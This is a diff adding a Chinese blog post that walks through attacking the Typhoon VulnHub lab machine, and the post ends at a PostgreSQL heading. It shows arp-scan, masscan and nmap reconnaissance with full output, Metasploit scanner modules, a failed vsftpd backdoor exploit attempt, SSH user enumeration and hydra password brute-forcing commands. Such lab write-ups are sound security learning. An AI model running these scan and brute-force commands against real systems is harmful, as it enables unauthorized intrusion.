@@ -1,0 +1,1363 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="靶机,nfs,nmap,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="prontosil" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。 今天又重新从https://vulnhub.com上把靶机搞下来装到Vmware上自己实验 靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用arp-scan和masscan工具 1234567891011# roo">
+<meta name="keywords" content="靶机,nfs,nmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="typhoon靶机渗透">
+<meta property="og:url" content="https://prontosil.club/2019/08/09/typhoon靶机渗透/index.html">
+<meta property="og:site_name" content="prontosil">
+<meta property="og:description" content="昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。 今天又重新从https://vulnhub.com上把靶机搞下来装到Vmware上自己实验 靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用arp-scan和masscan工具 1234567891011# roo">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/aaaaaaa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ftp0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon1.png">
+<meta property="og:updated_time" content="2019-08-09T09:14:10.209Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="typhoon靶机渗透">
+<meta name="twitter:description" content="昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。 今天又重新从https://vulnhub.com上把靶机搞下来装到Vmware上自己实验 靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用arp-scan和masscan工具 1234567891011# roo">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/aaaaaaa.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":10,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://prontosil.club/2019/08/09/typhoon靶机渗透/">
+
+
+
+
+
+  <title>typhoon靶机渗透 | prontosil</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/xinyongpeng"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">prontosil</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/09/typhoon靶机渗透/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">typhoon靶机渗透</h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T07:30:37+08:00">
+                2019-08-09
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-09T17:14:10+08:00">
+                2019-08-09
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulstudy/" itemprop="url" rel="index">
+                    <span itemprop="name">vulstudy</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/08/09/typhoon靶机渗透/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/08/09/typhoon靶机渗透/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。</p>
+<p>今天又重新从<a href="https://vulnhub.com上把靶机搞下来装到Vmware上自己实验" target="_blank" rel="noopener">https://vulnhub.com上把靶机搞下来装到Vmware上自己实验</a></p>
+<p>靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用<code>arp-scan</code>和<code>masscan</code>工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [3:04:28] C:1</span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.1	00:50:56:c0:00:08	VMware, Inc.</span><br><span class="line">192.168.41.2	00:50:56:e0:f7:aa	VMware, Inc.</span><br><span class="line">192.168.41.166	00:0c:29:d7:ef:a4	VMware, Inc.</span><br><span class="line">192.168.41.254	00:50:56:f5:fb:f6	VMware, Inc.</span><br><span class="line"></span><br><span class="line">62 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 7.212 seconds (35.50 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
+<p>前两个是类似网关的，第四个是kali的ip，中间第三个就是靶机的ip地址</p>
+<p>用<code>masscan</code>也可以发现,同时端口也可以扫出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [3:04:28] C:1</span><br><span class="line">$ masscan -p0-65535 192.168.41.0/24 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 07:05:04 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 256 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 631/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 139/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 80/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 22/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 5432/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 995/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 110/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 445/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 3306/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 27017/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 44337/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 6379/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 53/tcp on 192.168.41.2                                    </span><br><span class="line">Discovered open port 25/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 40811/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 33070/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 993/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 43074/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 21/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 53/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 2049/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 37535/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 8080/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 143/tcp on 192.168.41.166</span><br></pre></td></tr></table></figure>
+<p>nmap扫描最常用命令<code>nmap -sV -A -p- ip</code>可以扫描到靶机开放的端口和服务，当然那台靶机开放了好多好多个端口，需要记住一些常用的端口和它们对应的服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.110.164</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 985 filtered ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 3.0.2</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_ftp-bounce: bounce working!</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.110.72</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)</span><br><span class="line">|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)</span><br><span class="line">|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)</span><br><span class="line">|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)</span><br><span class="line">25/tcp   open  smtp?</span><br><span class="line">|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.9.5-3-Ubuntu</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/mongoadmin/</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Typhoon Vulnerable VM by PRISMA CSI</span><br><span class="line">110/tcp  open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE STLS SASL CAPA UIDL RESP-CODES</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100003  2,3,4       2049/tcp  nfs</span><br><span class="line">|   100003  2,3,4       2049/udp  nfs</span><br><span class="line">|   100005  1,2,3      43523/tcp  mountd</span><br><span class="line">|   100005  1,2,3      58512/udp  mountd</span><br><span class="line">|   100021  1,3,4      39728/udp  nlockmgr</span><br><span class="line">|   100021  1,3,4      59010/tcp  nlockmgr</span><br><span class="line">|   100024  1          39860/udp  status</span><br><span class="line">|   100024  1          57414/tcp  status</span><br><span class="line">|   100227  2,3         2049/tcp  nfs_acl</span><br><span class="line">|_  100227  2,3         2049/udp  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp  open  imap        Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: OK more Pre-login have post-login listed capabilities IMAP4rev1 LOGINDISABLEDA0001 ID IDLE STARTTLS ENABLE LITERAL+ SASL-IR LOGIN-REFERRALS</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">993/tcp  open  ssl/imaps?</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">995/tcp  open  ssl/pop3s?</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">2049/tcp open  nfs_acl     2-3 (RPC #100227)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">|_mysql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS</span><br><span class="line">|_  Potentially risky methods: PUT DELETE</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: WAP</span><br><span class="line">Running: Actiontec embedded, Linux</span><br><span class="line">OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel</span><br><span class="line">OS details: Actiontec MI424WR-GEN3I WAP</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Incremental</span><br><span class="line">Service Info: Host: TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>同时还有一个扫描结果：以前似乎没有看到过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 1h43m54s, median: 7h59m58s</span><br><span class="line">| nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   TYPHOON&lt;00&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   TYPHOON&lt;03&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   TYPHOON&lt;20&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 4.1.6-Ubuntu)</span><br><span class="line">|   Computer name: typhoon</span><br><span class="line">|   NetBIOS computer name: TYPHOON\x00</span><br><span class="line">|   Domain name: local</span><br><span class="line">|   FQDN: typhoon.local</span><br><span class="line">|_  System time: 2019-08-09T11:30:49+03:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2019-08-09 04:30:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.04 ms 192.168.41.2</span><br><span class="line">2   0.17 ms 192.168.110.164</span><br></pre></td></tr></table></figure>
+<p>我最先打的是2049端口，因为这个端口对应的是nfs服务，用这条命令：<br><code>nmap -sV --script=nfs-showmount  ip</code>扫出可以远程挂载的目录</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/aaaaaaa.png" alt=""></p>
+<p>之后尝试挂载，但是我无法用get命令将文件拷贝下来emmmm，主机也没有对应的挂载目录。</p>
+<p>队友打了21号端口，但是信息也不是很多</p>
+<p>22号端口是ssh服务，A组的师傅爆出了密码，参考安全客上的方法，可以先枚举用户名，</p>
+<blockquote>
+<p>发现靶机名字为typhoon就想着去测试一下看看账号存不存在,利用ssh用户枚举漏洞进行测试</p>
+</blockquote>
+<p>在GitHub上找了一个ssh_enum的脚本，尝试一下还行但是没有好字典</p>
+<p>hydra可以爆破弱口令： <code>hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150</code></p>
+<p>第一次渗透感觉还不是很熟练，能够做到的就是这些:cry:</p>
+<h3 id="21号端口"><a href="#21号端口" class="headerlink" title="21号端口"></a>21号端口</h3><p><code>search ftp_version</code>收集ftp服务器的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/ftp/ftp_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.41.166:21     - FTP Banner: &apos;220 (vsFTPd 3.0.2)\x0d\x0a&apos;</span><br><span class="line">[*] 192.168.41.166:21     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+<p>如果这个版本的ftp有漏洞的话是不是可以getshell？</p>
+<p>浏览器直接访问并没有什么东西<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon.png" alt=""></p>
+<p>尝试使用<code>exploit/unix/ftp/vsftpd_234_backdoor</code>进行渗透但是没成功</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ftp0.png" alt=""></p>
+<h3 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h3><p>尝试枚举用户名为<code>typhoon</code></p>
+<p>成功枚举<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon0.png" alt=""></p>
+<p>使用hydra去爆破密码<code>hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.41.166</code></p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon1.png" alt=""></p>
+<h3 id="25端口smtp服务"><a href="#25端口smtp服务" class="headerlink" title="25端口smtp服务"></a>25端口smtp服务</h3><p>获取到服务器的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smtp/smtp_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.41.166:25     - 192.168.41.166:25 SMTP 220 typhoon ESMTP Postfix (Ubuntu)\x0d\x0a</span><br><span class="line">[*] 192.168.41.166:25     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p>
+<h3 id="5432端口postgresql服务"><a href="#5432端口postgresql服务" class="headerlink" title="5432端口postgresql服务"></a>5432端口postgresql服务</h3><p>补充一点postgresql操作：</p>
